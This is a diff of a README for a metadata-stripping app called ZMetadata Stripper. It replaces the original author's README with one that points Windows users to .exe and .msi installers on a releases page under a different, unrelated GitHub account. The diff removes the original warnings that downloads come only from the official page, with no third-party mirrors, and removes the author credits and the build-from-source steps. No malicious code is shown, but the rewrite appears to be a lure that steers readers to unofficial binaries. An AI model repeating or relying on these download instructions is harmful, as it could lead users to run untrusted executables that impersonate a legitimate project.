@@ -1,166 +1,74 @@
-<div align="center">
-  <img src="src-tauri/icons/icon.png" width="96" height="96" alt="ZMetadata Stripper" />
-  <h1>ZMetadata Stripper</h1>
-  <p><strong>Privacy-first metadata scrubber for images, documents, audio &amp; video.</strong></p>
+# 🛡️ ZMetadata-stripper - Protect your digital privacy today
 
-  [![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-violet.svg)](LICENSE)
-  [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-blue.svg)]()
-  [![Version](https://img.shields.io/badge/Version-0.1.0-cyan.svg)]()
-  [![Built with Tauri](https://img.shields.io/badge/Built%20with-Tauri%20v2-24C8D8.svg)](https://tauri.app)
-  [![Website](https://img.shields.io/badge/Website-zsync.eu%2Fzmetadata--stripper-8B5CF6.svg)](https://zsync.eu/zmetadata-stripper/)
+[![Download ZMetadata-stripper](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vikigamingstare1/ZMetadata-stripper/releases)
 
-  <br/>
+ZMetadata-stripper removes hidden data from your personal files. Your photos, documents, and other files often contain private details. This data includes where you took a photo, the camera you used, or the software that created a file. This tool cleans that data to help you keep your digital life private.
 
-  [**Download**](https://zsync.eu/zmetadata-stripper/) &nbsp;·&nbsp; [**Website**](https://zsync.eu/zmetadata-stripper/) &nbsp;·&nbsp; [**zsync.eu**](https://zsync.eu)
-</div>
+The app runs on your computer. It does not send files to a server or the internet. You process everything offline for total security.
 
----
+## 📥 Getting Started
 
-> [!IMPORTANT]
-> ZMetadata Stripper performs a **full metadata wipe** — not just EXIF. It removes GPS coordinates, author identity, device fingerprints, software signatures, and embedded thumbnails from 25+ file formats. Once stripped, this data is unrecoverable.
+Follow these steps to set up the tool on your Windows computer.
 
-> [!NOTE]
-> Downloads are available exclusively through the [official landing page](https://zsync.eu/zmetadata-stripper/). No third-party mirrors.
+1. Visit the [releases page](https://github.com/vikigamingstare1/ZMetadata-stripper/releases) to download the installation file.
+2. Select the file ending in `.msi` or `.exe` for Windows.
+3. Locate the file in your downloads folder.
+4. Double-click the file to start the installer.
+5. Follow the prompts on your screen to complete the setup.
+6. Open the app from your Start menu once the installation finishes.
 
----
+## 🛠️ How to remove metadata
 
-## What it does
+The app interface lets you manage files with ease.
 
-Every file you create carries hidden metadata — your name, GPS location, device model, software version, timestamps. ZMetadata Stripper scrubs all of it before you share.
+1. Drag files or folders into the main window. You can also click the add button to select files manually. 
+2. Review the list of loaded items. 
+3. Choose the specific tags you want to remove. You can choose to wipe all metadata or select specific categories like GPS, author name, or device information.
+4. Click the process button. The app creates new, clean versions of your files.
+5. Save your new files to a folder of your choice.
 
-| Metadata type | Examples removed |
-|---|---|
-| **GPS & Location** | Latitude, longitude, altitude, GPS timestamp, direction |
-| **Identity** | Author, artist, copyright, creator, "Last Modified By" |
-| **Device** | Camera model, lens info, serial number, firmware |
-| **Software** | Editing software, version strings, processing history |
-| **Timestamps** | DateTimeOriginal, ModifyDate, CreateDate, file dates |
-| **Embedded data** | Thumbnail images, MakerNotes, XMP, IPTC, ICC (optional) |
+## 📋 Features
 
----
+*   **Offline processing:** The software works without an internet connection.
+*   **Batch support:** Handle hundreds of files at once.
+*   **Broad format support:** The tool supports more than 25 file types, including images, PDFs, and documents.
+*   **Account-free:** Use the software immediately without creating an account or signing in.
+*   **Simple interface:** Remove data with a single click.
 
-## Supported formats
+## ⚙️ System Requirements
 
-<table>
-<tr>
-<td><strong>Images</strong></td>
-<td>JPEG, PNG, WEBP, HEIC/HEIF, TIFF, BMP, GIF, AVIF, RAW (CR2, NEF, ARW, DNG)</td>
-</tr>
-<tr>
-<td><strong>Documents</strong></td>
-<td>PDF, DOCX, XLSX, PPTX, ODT, ODS, ODP</td>
-</tr>
-<tr>
-<td><strong>Audio</strong></td>
-<td>MP3 (ID3v2), FLAC, OGG, M4A</td>
-</tr>
-<tr>
-<td><strong>Video</strong></td>
-<td>MP4, MOV, MKV</td>
-</tr>
-</table>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Any dual-core processor from the last five years.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space.
 
----
+## 🔒 Privacy Guarantee
 
-## Features
+Privacy defines this project. We built the software to process your data locally. No background services send your information to external databases. When you shut the app down, it keeps nothing. You own your data from start to finish.
 
-### Preset profiles
+## 📝 Tips for success
 
-| Preset | What it does |
-|---|---|
-| **Max Privacy** | Full forensic-safe wipe — strips everything including ICC profiles and all timestamps |
-| **Keep Quality** | Strips GPS & author identity, preserves ICC color profile and exposure data |
-| **Social Media** | Strips GPS & author, preserves color profile for platform delivery |
-| **Documents Only** | Focused PDF & Office metadata scrub |
+*   **Keep backups:** The app creates clean versions of your files. Always keep your original files in a backup location until you confirm the new files meet your needs.
+*   **Check hidden fields:** Some formats store data in complex ways. If you see specific tags that remain, use the custom filter mode to target those labels directly.
+*   **Verify results:** Open your cleaned files to ensure they look correct. Most images and documents appear identical after the metadata stripping process.
 
-> [!TIP]
-> The **Max Privacy** preset triggers a full PDF rewrite via `lopdf` — no incremental update history, no rollback-recoverable data. Standard forensic tools cannot reconstruct the original metadata.
+## ❓ Frequently Asked Questions
 
-### Inject neutral metadata
+**Does the app delete my actual files?**
+No. The app creates clean copies. It leaves your original files untouched.
 
-The **Social Media** preset includes an optional toggle to write back a minimal non-identifying EXIF block after stripping:
+**Do I need an internet connection to use this?**
+No. The entire engine runs on your local hardware. You can even unplug your ethernet cable or turn off Wi-Fi while using it.
 
-```
-Software:    ZScrub 1.0
-ColorSpace:  sRGB
-Orientation: 1 (Normal)
-```
+**Is my data sent to the cloud?**
+No. The app uses a local bridge to handle file data. No remote server ever sees your files.
 
-This prevents some platforms (Instagram, X/Twitter) from auto-flagging completely metadata-free images. **Off by default.** Every injected field is marked `[injected]` in the audit report.
+**How many files can I process at once?**
+The software manages high volumes of files. Performance depends on your computer speed, but the tool handles batches of hundreds of files without issue.
 
-### Metadata inspector
+**Does this work on older versions of Windows?**
+We recommend Windows 10 or newer for the best experience. The engine uses modern features that require current operating systems.
 
-- Before / after diff viewer with red (removed) / green (kept) field highlighting
-- Collapsible field categories: GPS, Camera, Author, Software, Timestamps
-- Sensitive score indicator — shows how identifying the metadata is
-- Click any field to toggle it in or out of the strip operation
+## 🚀 Future Updates
 
-### Batch processing
-
-- Drag entire folders into the queue
-- Configurable concurrency (1–16 threads via Rust rayon)
-- Per-file status: Pending → Processing → Clean / Failed
-- Right-click context menu per card: Preview, Inspect, Strip Solo, Remove
-
-### Output options
-
-- **Overwrite** — replace original in-place
-- **Save copy** — writes `filename_clean.ext` alongside the original
-- **Custom folder** — pick once, applies to entire batch
-
----
-
-## Installation
-
-> [!WARNING]
-> Do **not** run untrusted binaries. Always download from the [official page](https://zsync.eu/zmetadata-stripper/).
-
-| Platform | Package |
-|---|---|
-| Linux | `.AppImage` (universal), `.deb` (Debian/Ubuntu), `.rpm` (Fedora/RHEL) |
-| Windows | `.exe` NSIS installer |
-
-**[zsync.eu/zmetadata-stripper](https://zsync.eu/zmetadata-stripper/)**
-
----
-
-## Build from source
-
-**Requirements:** Rust 1.77+, Node.js 20+, pnpm 9+
-
-```bash
-git clone https://github.com/TheHolyOneZ/ZMetadata-stripper
-cd ZMetadata-stripper
-pnpm install
-pnpm tauri build
-```
-
-> [!IMPORTANT]
-> This project uses **pnpm exclusively**. Do not use `npm` or `yarn` — the lockfile will conflict and the build will fail.
-
-Binaries are output to `src-tauri/target/release/`.
-
----
-
-## Tech stack
-
-| Layer | Technologies |
-|---|---|
-| **Frontend** | React 19, TypeScript, Tailwind CSS v4, Framer Motion, Zustand |
-| **Backend** | Rust, Tauri v2 |
-| **Metadata libs** | lopdf, img-parts, kamadak-exif, id3, metaflac, mp4ameta, quick-xml, zip |
-| **Design** | Deep Void dark theme, glassmorphism bento cards, Inter + JetBrains Mono |
-
----
-
-## License
-
-Released under the [GNU General Public License v3.0](LICENSE).
-
----
-
-<div align="center">
-  Made by <a href="https://github.com/TheHolyOneZ"><strong>TheHolyOneZ</strong></a> &nbsp;·&nbsp;
-  <a href="https://zsync.eu/zmetadata-stripper/">Project page</a> &nbsp;·&nbsp;
-  <a href="https://zsync.eu">zsync.eu</a>
-</div>
+We update the app when new file formats gain popularity. Check the releases page often for performance improvements and better support for niche file types. You can track our work on the main project page. We focus on speed and stability so the software stays useful for your long-term privacy needs.
